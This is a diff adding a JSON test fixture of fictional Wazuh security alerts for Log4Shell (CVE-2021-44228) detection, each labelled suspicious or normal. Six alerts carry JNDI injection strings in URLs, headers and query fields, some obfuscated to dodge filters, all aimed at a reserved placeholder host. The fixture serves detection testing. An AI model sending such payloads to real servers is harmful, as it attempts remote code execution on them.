@@ -1,0 +1,401 @@
+{
+  "schema": "aleph.xdr.fixture.v1",
+  "moduleKey": "known-cve",
+  "note": "가상 교육용 Wazuh 경보. 실제 서버 로그 아님.",
+  "alerts": [
+    {
+      "id": "kc-01",
+      "timestamp": "2026-10-13T08:00:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 12,
+        "description": "가상 HTTP 요청에서 외부 조회 표현식 감지",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "203.0.113.11",
+        "srcuser": "user01",
+        "url": "/search?find=%24%7Bjndi%3Aldap%3A%2F%2Flookup.invalid%2Fexample%7D"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-02",
+      "timestamp": "2026-10-13T08:01:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 12,
+        "description": "가상 HTTP 요청에서 외부 조회 표현식 감지",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "203.0.113.12",
+        "srcuser": "user02",
+        "url": "/notes?view=recent",
+        "headers": {
+          "User-Agent": "sample-browser",
+          "X-Trace": "${jndi:rmi://lookup.invalid/check}"
+        }
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-03",
+      "timestamp": "2026-10-13T08:02:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 12,
+        "description": "가상 HTTP 요청에서 외부 조회 표현식 감지",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "203.0.113.13",
+        "srcuser": "user03",
+        "url": "/notes?view=recent",
+        "headers": {
+          "User-Agent": "${jndi:dns://lookup.invalid/check}"
+        }
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-04",
+      "timestamp": "2026-10-13T08:03:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 12,
+        "description": "가상 HTTP 요청에서 외부 조회 표현식 감지",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "203.0.113.14",
+        "srcuser": "user04",
+        "url": "/notes?view=recent",
+        "request": "GET /notes?q=%24%7Bjndi%3Aldaps%3A%2F%2Flookup.invalid%2Fr%7D HTTP/1.1"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-05",
+      "timestamp": "2026-10-13T08:04:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 12,
+        "description": "가상 HTTP 요청에서 외부 조회 표현식 감지",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "203.0.113.15",
+        "srcuser": "user05",
+        "url": "/notes?view=recent",
+        "query": "${${lower:j}ndi:ldap://lookup.invalid/marker}"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-06",
+      "timestamp": "2026-10-13T08:05:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 12,
+        "description": "가상 HTTP 요청에서 외부 조회 표현식 감지",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "203.0.113.16",
+        "srcuser": "user06",
+        "url": "/notes?view=recent",
+        "payload": "${JnDi:LDAP://lookup.invalid/request}"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-07",
+      "timestamp": "2026-10-13T08:06:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 7,
+        "description": "CVE-2021-44228 취약점 진단 경보, 요청 조회 구문 확인되지 않음",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "198.51.100.27",
+        "srcuser": "user07",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-08",
+      "timestamp": "2026-10-13T08:07:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 7,
+        "description": "Log4Shell 검사 도구 접속 흔적 확인, 실제 원격 조회는 미확인",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "198.51.100.28",
+        "srcuser": "user08",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-09",
+      "timestamp": "2026-10-13T08:08:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 7,
+        "description": "JNDI 문자열을 기록한 요청 가능성 확인 필요",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "198.51.100.29",
+        "srcuser": "user09",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-10",
+      "timestamp": "2026-10-13T08:09:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 7,
+        "description": "외부 서비스 요청의 비정상 패턴 확인 필요",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "198.51.100.30",
+        "srcuser": "user10",
+        "url": "/docs?subject=jndi:ldap"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-11",
+      "timestamp": "2026-10-13T08:10:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 11,
+        "description": "T1190 범주 탐색 활동, 직접적인 취약점 조회 구문 없음",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "198.51.100.31",
+        "srcuser": "user11",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-12",
+      "timestamp": "2026-10-13T08:11:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 7,
+        "description": "Log4j 취약 버전 탐지 시도, 정상 점검 여부 불명확",
+        "mitre": [
+          "T1190"
+        ]
+      },
+      "data": {
+        "srcip": "198.51.100.32",
+        "srcuser": "user12",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "suspicious"
+      }
+    },
+    {
+      "id": "kc-13",
+      "timestamp": "2026-10-13T08:12:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 2,
+        "description": "보안 업데이트 설치 안내 화면 조회",
+        "mitre": []
+      },
+      "data": {
+        "srcip": "192.0.2.43",
+        "srcuser": "user13",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "normal"
+      }
+    },
+    {
+      "id": "kc-14",
+      "timestamp": "2026-10-13T08:13:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 2,
+        "description": "평상시 로그인 성공",
+        "mitre": []
+      },
+      "data": {
+        "srcip": "192.0.2.44",
+        "srcuser": "user14",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "normal"
+      }
+    },
+    {
+      "id": "kc-15",
+      "timestamp": "2026-10-13T08:14:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 2,
+        "description": "로그4j 관련 교육 문서 조회",
+        "mitre": []
+      },
+      "data": {
+        "srcip": "192.0.2.45",
+        "srcuser": "user15",
+        "url": "/help?topic=log4j"
+      },
+      "fixture": {
+        "classification": "normal"
+      }
+    },
+    {
+      "id": "kc-16",
+      "timestamp": "2026-10-13T08:15:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 2,
+        "description": "일반적인 메모 목록 페이지 이동",
+        "mitre": []
+      },
+      "data": {
+        "srcip": "192.0.2.46",
+        "srcuser": "user16",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "normal"
+      }
+    },
+    {
+      "id": "kc-17",
+      "timestamp": "2026-10-13T08:16:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 2,
+        "description": "사용자 로그아웃",
+        "mitre": []
+      },
+      "data": {
+        "srcip": "192.0.2.47",
+        "srcuser": "user17",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "normal"
+      }
+    },
+    {
+      "id": "kc-18",
+      "timestamp": "2026-10-13T08:17:00.000Z",
+      "agent": {
+        "name": "choi-bujang-pc"
+      },
+      "rule": {
+        "level": 2,
+        "description": "정상 장비 상태 점검",
+        "mitre": []
+      },
+      "data": {
+        "srcip": "192.0.2.48",
+        "srcuser": "user18",
+        "url": "/notes?view=recent"
+      },
+      "fixture": {
+        "classification": "normal"
+      }
+    }
+  ]
+}
